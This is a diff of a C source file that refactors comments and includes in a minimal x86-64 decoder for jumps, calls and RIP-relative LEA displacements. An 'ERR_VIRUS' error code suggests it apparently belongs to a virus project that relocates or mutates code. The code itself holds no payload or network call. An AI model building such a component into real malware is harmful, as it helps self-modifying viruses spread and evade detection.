@@ -1,7 +1,6 @@
-
 #include <unistd.h>
 #include "disasm_utils.h"
-#include "bytes.h"
+#include "compiler_utils.h"
 #include "utils.h"
 #include "errors.h"
 
@@ -14,54 +13,54 @@ Jc(onditionnal)c(ode) notes:
 
 /*
 ** return true if successfully disassembled a control flow instruction
-** return false if failed to disassembled a control flow instruction
+** return false if failed to disassemble a control flow instruction
 */
-
-static bool	disasm_instruction(void **value_addr, \
-			int32_t *value, uint8_t *value_length, \
+static bool	disasm_instruction(void **value_addr,
+			int32_t *value, uint8_t *value_length,
 			const void *code, size_t codelen)
 {
 	uint8_t		*p = (uint8_t*)code;
-	uint8_t		prefix = 0;              /* prefix(es) */
+	uint8_t		prefix = 0;              // prefix(es)
 	uint8_t		opcode;
 
 	*value_addr = NULL;
 	*value = 0;
 
-	/* set <codelen> to INSTRUCTION_MAXLEN if it exceeds it */
+	// set <codelen> to INSTRUCTION_MAXLEN if it exceeds it
 	if (codelen > INSTRUCTION_MAXLEN) codelen = INSTRUCTION_MAXLEN;
 
-	/* prefix loop */
+	// prefix loop
 	next_opcode:
 
-	if (!codelen--) return false; /* error if instruction is too long */
+	if (!codelen--)
+		return false; // error if instruction is too long
 	opcode = *p++;
 
-	/* check if has prefix */
+	// check if has prefix
 	if (opcode == 0x0f) {prefix |= OP_PREFIX_0F; goto next_opcode;}
-	/* check if has REX    */
+	// check if has REX
 	if (opcode >= 0x40 && opcode <= 0x4f) {goto next_opcode;}
 
-	/* rel8 */
-	if ((opcode >= 0x70 && opcode <= 0x7f)           /* JMPcc             */
-	|| (opcode >= 0xe0 && opcode <= 0xe3)            /* LOOP/LOOPcc/JMPcc */
-	|| (opcode == 0xeb))                             /* JMP               */
+	// rel8
+	if ((opcode >= 0x70 && opcode <= 0x7f)           // JMPcc
+	|| (opcode >= 0xe0 && opcode <= 0xe3)            // LOOP/LOOPcc/JMPcc
+	|| (opcode == 0xeb))                             // JMP
 	{
 		*value_addr = p;
 		*value = *((int8_t*)p);
 		*value_length = BYTE;
 	}
-	/* rel16/32 */
-	else if ((opcode == 0xe8)                          /* CALL            */
-	|| (opcode == 0xe9)                                /* JMP             */
-	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) /* JMPcc           */
+	// rel16/32
+	else if ((opcode == 0xe8)                          // CALL
+	|| (opcode == 0xe9)                                // JMP
+	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) // JMPcc
 	{
 		*value_addr = p;
 		*value = *((int32_t*)p);
 		*value_length = DWORD;
 	}
-	/* [rip + displacement] */
-	else if (opcode == 0x8d)                           /* LEA             */
+	// [rip + displacement]
+	else if (opcode == 0x8d)                           // LEA
 	{
 		if (!codelen--) return false;
 		opcode = *p++;
@@ -69,8 +68,7 @@ static bool	disasm_instruction(void **value_addr, \
 		uint8_t	mod = (opcode & 0b11000000) >> 6;
 		uint8_t	rm  = opcode & 0b00000111;
 
-		// 48 8d 35 42 00 00 00
-		if (mod == 0b00 && rm == 0b101)  /* RIP-relative addressing */
+		if (mod == 0b00 && rm == 0b101)  // RIP-relative addressing
 		{
 			*value_addr = p;
 			*value = *((int32_t*)p);
@@ -110,6 +108,6 @@ size_t		disasm_jumps(struct control_flow *buf, size_t buflen,
 	// if bufflen reached 0 but not codelen, MAX_JUMPS is too small
 	if (codelen != 0) return errors(ERR_VIRUS, _ERR_V_MAX_JUMP_TOO_SMALL);
 
-	/* number of control flow instructions successfully disassembled */
+	// number of control flow instructions successfully disassembled
 	return p_buf - buf;
 }
